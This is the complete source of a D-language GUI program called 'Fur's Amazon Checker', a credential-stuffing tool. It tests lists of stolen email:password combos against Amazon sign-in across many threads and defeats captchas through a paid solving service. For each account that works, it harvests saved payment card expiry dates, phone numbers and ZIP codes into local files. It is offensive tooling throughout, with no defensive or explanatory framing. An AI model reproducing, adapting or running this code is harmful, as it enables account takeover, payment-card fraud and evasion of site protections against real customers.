module main;
pragma(lib, "dl");

import core.time;
import etc.c.curl : CurlOption, CurlInfo;
import gtk.Button;
import gtk.Entry;
import gtk.FileChooserDialog;
import gtk.Label;
import gtk.Main;
import gtk.MainWindow;
import gtk.SpinButton;
import gtk.VBox;
import std.array;
import std.conv;
import std.digest.md;
import std.exception;
import std.file;
import std.json;
import std.net.curl;
import std.parallelism;
import std.random;
import std.regex;
import std.stdio;
import std.string;
import std.uuid;
import core.sys.windows.windows;
import core.stdc.string;

string runCaptcha(string img, string duser, string dpass)
{
	writeln("Running Captcha Check!");
	string text;
	string bound = "---------------------------723690991551375881941829999";
	auto conn = HTTP("http://api.dbcapi.me/api/captcha");
	conn.handle.set(CurlOption.followlocation, false);
	conn.handle.set(CurlOption.ssl_verifypeer, false);
	conn.addRequestHeader("Content-Type", "multipart/form-data; boundary=" ~ bound ~ "; charset=UTF-8");
	conn.addRequestHeader("Accept", "application/json; charset=utf-8");
	string postData = "--" ~ bound ~ "\r\nContent-Disposition: form-data; name=\"username\"\r\n\r\n" ~ to!string(duser) ~ "\r\n--" ~ bound ~ "\r\nContent-Disposition: form-data; name=\"password\"\r\n\r\n" ~ to!string(dpass) ~ "\r\n--" ~ bound ~ "\r\nContent-Disposition: form-data; name=\"captchafile\"; filename=\"captchafile\";\r\nContent-Type: application/octet-stream\r\n\r\n" ~ to!string(img) ~ "\r\n--" ~ bound ~ "--\r\n";
	conn.postData = postData;
	conn.perform();
	string url = conn.responseHeaders["location"];
	bool solved = false;
	while(!solved)
	{
		ubyte[] result;
		auto conn1 = HTTP(url);
		conn1.handle.set(CurlOption.ssl_verifypeer, false);
		conn1.addRequestHeader("Accept", "application/json; charset=utf-8");
		conn1.onReceive = (ubyte[] data)
		{
			result ~= data;
			return data.length;
		};
		conn1.perform();
		char* cstr = cast(char*) result;
		string str = cast(string) cstr[0..strlen(cstr)];
		
		auto js = parseJSON(str);
		if (!chomp(js["text"].str).empty)
		{
			text = js["text"].str;
			writeln("Found Captcha Text: " ~ text);
			solved = true;
		}
		else
		{
			core.thread.Thread.sleep(dur!("seconds")(1));
		}
	}
	return text;
}

void runCard(string user, string pass, string duser, string dpass)
{
	while (true) {
		try
		{
			writeln("Begin Checking Account! " ~ user);
			bool working = false;
			bool preferences = false;
			char[][] orders;
			string gcb;
			string captchatext;
			auto conn = HTTP();
			conn.handle.set(CurlOption.ssl_verifypeer, false);
			conn.operationTimeout(dur!"seconds"(10));
			
			auto rand = uniform(99999999999999, 99999999999999999);
			conn.setCookieJar(tempDir() ~ to!string(rand));
			conn.addRequestHeader("User-Agent", "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.0 Safari/537.36");
			auto html = get("http://myhabit.com/card", conn);
			
			auto appActionToken = match(html, regex("appActionToken\" value=\"(.*?)\"")).captures[1];
			auto prevRID = match(html, regex("prevRID\" value=\"(.*?)\"")).captures[1];
			auto clientContext = match(html, regex("clientContext\" value=\"(.*?)\"")).captures[1];
			string postData = "appActionToken=" ~ to!string(appActionToken) ~ "&prevRID=" ~ to!string(prevRID) ~ "&email=" ~ user ~ "&password=" ~ pass ~ "&appAction=SIGNIN&openid.ns=ape%3AaHR0cDovL3NwZWNzLm9wZW5pZC5uZXQvYXV0aC8yLjA%3D&pageId=ape%3AcXVhcnRlcmRlY2s%3D&openid.identity=ape%3AaHR0cDovL3NwZWNzLm9wZW5pZC5uZXQvYXV0aC8yLjAvaWRlbnRpZmllcl9zZWxlY3Q%3D&clientContext=" ~ to!string(clientContext) ~ "&siteState=ape%3AaHR0cDovL3d3dy5teWhhYml0LmNvbS9jYXJkP2ZlYXR1cmVzPVNpZ25pbkFsdGVybmF0ZUltYWdlL0M7VW53YWxsZWREZXRhaWxQYWdlL1QxO0dvZHNvbkdpdmVHZXQvVDE7&openid.claimed_id=ape%3AaHR0cDovL3NwZWNzLm9wZW5pZC5uZXQvYXV0aC8yLjAvaWRlbnRpZmllcl9zZWxlY3Q%3D&openid.mode=ape%3AY2hlY2tpZF9zZXR1cA%3D%3D&openid.assoc_handle=ape%3AcXVhcnRlcmRlY2s%3D&marketPlaceId=ape%3AQTM5V1JDMklCOFlHRUs%3D&openid.return_to=ape%3AaHR0cHM6Ly93d3cubXloYWJpdC5jb20vc2lnbmlu&create=0";
			html = post("https://www.amazon.com/ap/signin", postData.replace(":", "%3A"), conn);
			if (html.indexOf("Enter the characters as they are shown in the image.") != -1 || html.indexOf("To better protect your account") != -1)
			{
				 if (duser != null) {
					bool captcha = true;
					while (captcha)
					{
						writeln("Account Has Captcha! " ~ user);
						
						auto captcha1 = match(html, regex("<div id=\"ap_captcha_img\">\n    <img src=\"(.*?)\" />")).captures[1];
						if (!captcha1.empty)
						{
							if (captcha1.indexOf("data:image/jpeg;base64") != -1)
							{
								auto decoded = to!string(captcha1).replace("data:image/jpeg;base64,", "base64:");
								captchatext = runCaptcha(decoded, duser, dpass);
							}
							else if (captcha1.indexOf("https://") != -1)
							{
								auto captchas = get(chomp(to!string(captcha1)), conn);
								captchatext = runCaptcha(to!string(captchas), duser, dpass);
							}
						}
						
						auto captcha2 = match(html, regex("<img alt=\"\" src=\"(.*?)\" data-refresh-url")).captures[1];
						if (!captcha2.empty)
						{
							if (captcha2.indexOf("data:image/jpeg;base64") != -1)
							{
								captchatext = runCaptcha(to!string(captcha2).replace("data:image/jpeg;base64,", "base64:"), duser, dpass);
							}
							else if (captcha2.indexOf("https://") != -1)
							{
								captchatext = runCaptcha(to!string(get(chomp(to!string(captcha2)), conn)), duser, dpass);
							}
						}
						appActionToken = match(html, regex("appActionToken\" value=\"(.*?)\"")).captures[1];
						prevRID = match(html, regex("prevRID\" value=\"(.*?)\"")).captures[1];
						clientContext = match(html, regex("clientContext\" value=\"(.*?)\"")).captures[1];
						auto ces = match(html, regex("ces\" value=\"(.*?)\"")).captures[1];
						postData = "appActionToken=" ~ chomp(to!string(appActionToken)) ~ "&prevRID=" ~ chomp(to!string(prevRID)) ~ "&email=" ~ user ~ "&password=" ~ pass ~ "&ces=" ~ chomp(to!string(ces)) ~ "&guess=" ~ captchatext ~ "&forceValidateCaptcha=ape:dHJ1ZQ==&appAction=SIGNIN&openid.ns=ape%3AaHR0cDovL3NwZWNzLm9wZW5pZC5uZXQvYXV0aC8yLjA%3D&pageId=ape%3AcXVhcnRlcmRlY2s%3D&openid.identity=ape%3AaHR0cDovL3NwZWNzLm9wZW5pZC5uZXQvYXV0aC8yLjAvaWRlbnRpZmllcl9zZWxlY3Q%3D&clientContext=" ~ to!string(clientContext) ~ "&siteState=ape%3AaHR0cDovL3d3dy5teWhhYml0LmNvbS9jYXJkP2ZlYXR1cmVzPVNpZ25pbkFsdGVybmF0ZUltYWdlL0M7VW53YWxsZWREZXRhaWxQYWdlL1QxO0dvZHNvbkdpdmVHZXQvVDE7&openid.claimed_id=ape%3AaHR0cDovL3NwZWNzLm9wZW5pZC5uZXQvYXV0aC8yLjAvaWRlbnRpZmllcl9zZWxlY3Q%3D&openid.mode=ape%3AY2hlY2tpZF9zZXR1cA%3D%3D&openid.assoc_handle=ape%3AcXVhcnRlcmRlY2s%3D&marketPlaceId=ape%3AQTM5V1JDMklCOFlHRUs%3D&openid.return_to=ape%3AaHR0cHM6Ly93d3cubXloYWJpdC5jb20vc2lnbmlu&create=0";
						html = post("http://www.amazon.com/ap/signin", postData.replace(":", "%3A"), conn);
						if (html.indexOf("Enter the characters as they are shown in the image.") != -1 || html.indexOf("To better protect your account") != -1)
						{
							writeln("Account Still Has Captcha! " ~ user);
							captcha = true;
						} 
						else if (html.indexOf("There was an error with your E-Mail/Password combination") != -1)
						{
							writeln("Account Does Not Work! " ~ user);
							return;
						}
						else if (html.indexOf("Server Busy") != -1)
						{
							writeln("IP Banned!");
							return;
						}
						else if (html.indexOf("HELP US CUSTOMIZE YOUR SHOPPING EXPERIENCE") != -1)
						{
							writeln("Account Works! " ~ user);
							preferences = true;
						}
						else if (html.indexOf("Welcome,") != -1)
						{
							writeln("Account Works! " ~ user);
							working = true;
						}
					}
				}
			}
			else if (html.indexOf("There was an error with your E-Mail/Password combination") != -1)
			{
				writeln("Account Does Not Work! " ~ user);
				return;
			}
			else if (html.indexOf("Server Busy") != -1)
			{
				writeln("IP Banned!");
				return;
			}
			else if (html.indexOf("HELP US CUSTOMIZE YOUR SHOPPING EXPERIENCE") != -1)
			{
				writeln("Account Works! " ~ user);
				preferences = true;
			}
			else if (html.indexOf("Welcome,") != -1)
			{
				writeln("Account Works! " ~ user);
				working = true;
			}

			if (preferences)
			{
				appActionToken = match(html, regex("appActionToken\" value=\"(.*?)\"")).captures[1];
				html = post("https://www.myhabit.com/preferences", "defaultDepartment=women&shippingPreference=US&appActionToken=" ~ appActionToken ~ "&appAction=submitPreferences&redirectUrl=%2Fcard&redirectQuery=hash%3D&redirectProtocol=http&refCust=&x=31&y=14", conn);
				working = true;
			}

			if (working)
			{
				html = get("https://www.myhabit.com/card", conn);
				if (html.indexOf("Cardholder Name:") != -1) {
					auto exp = match(html, regex("expires\">.*?\n(.*?)\n")).captures[1];
					html = get("https://www.myhabit.com/addressbook", conn);
					auto phone = match(html, regex("phone\">(.*?)<")).captures[1];
					auto zip = match(html, regex("Zip\">(.*?)<")).captures[1];
					string content = "====================================\r\nAccount: " ~ user ~ ":" ~ pass ~ "\r\nExp. Date: " ~ chomp(to!string(exp)) ~ "\r\nPhone: " ~ chomp(to!string(phone)) ~ "\r\nZip: " ~ chomp(to!string(zip)) ~ "\r\n====================================\r\n\r\n";
					std.file.append("./Cards Working.txt", content);
				}
				else
				{
					string content = "====================================\r\nAccount: " ~ user ~ ":" ~ pass ~ "\r\n====================================\r\n\r\n";
					std.file.append("./Working.txt", content);
				}
				delete html;
				conn.clearAllCookies();
				return;
			}
		} catch (Exception e) {
			writeln(e.msg);
			core.thread.Thread.sleep(dur!("seconds")(1));
		}
	}
}

void startRun(string file, int threads, string duser = null, string dpass = null)
{
	auto accounts = readText(file).splitLines();
	auto work = new TaskPool(threads);
	foreach (account; work.parallel(accounts))
	{
		if(account.indexOf(":") != -1 && account.indexOf("@") != -1)
		{
			auto arr = split(account, ":");
			runCard(to!string(chomp(arr[0])), to!string(chomp(arr[1])), duser, dpass);
		}
	}
}


class Amazon : MainWindow
{
	Label StatusLbl;
	string combofile;
	bool saveMulti = false;
	SpinButton spinb;
	Entry user;
	Entry pass;
	this()
	{
		super("Fur's Amazon Checker");
		setDefaultSize(250, 250);
		VBox box = new VBox(false, 2);
		box.add(new Button("Load Combos", &loadCombos));
		box.add(new Label("Threads"));
		spinb = new SpinButton(1, 15, 1);
		box.add(spinb);
		box.add(new Label("DBC User (If using DBC)"));
		user = new Entry();
		box.add(user);
		box.add(new Label("DBC Password (If using DBC)"));
		pass = new Entry();
		box.add(pass);
		box.add(new Button("Start", &start));
		add(box);
		showAll();	
	}
	 
	void loadCombos(Button button)
	{
		auto dlg = new FileChooserDialog(
			"Open File",
			this,
			FileChooserAction.OPEN,
			["Open", "Cancel"],
			[ResponseType.ACCEPT, ResponseType.CANCEL]
			);
		if (GtkResponseType.ACCEPT == dlg.run()){
			combofile = dlg.getFilename();
		}
		dlg.destroy();
	}
	void start(Button button)
	{
		if (user.getText().empty) {
			startRun(combofile, to!int(spinb.getText));
		} else {
			startRun(combofile, to!int(spinb.getText), user.getText(), pass.getText());
		}
		writeln("Done Checking!");
	}
}

void main(string[] args)
{
	Main.init(args);
	auto mwin = new Amazon();
	Main.run();
}